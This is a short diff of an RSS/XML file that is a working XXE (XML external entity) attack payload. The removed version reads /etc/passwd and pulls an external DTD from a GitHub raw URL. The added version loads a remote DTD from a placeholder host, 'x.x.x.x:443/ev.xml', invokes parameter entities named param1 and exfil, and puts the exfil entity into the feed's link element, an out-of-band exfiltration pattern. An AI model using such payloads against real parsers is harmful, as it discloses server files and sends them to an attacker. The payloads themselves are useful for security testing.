@@ -1,15 +1,16 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE root [
- <!ENTITY % start "<![CDATA[">
- <!ENTITY % stuff SYSTEM "file:///etc/passwd">
-<!ENTITY % end "]]>">
-<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.xml">
-%dtd;
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml">
+%sp;
+%param1;
+%exfil;
 ]>
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page</title>
-  <link>&all;</link>
+  <link>&exfil;</link>
   <description>Free web building tutorials</description>
   <item>
     <title>aaaaaa</title>
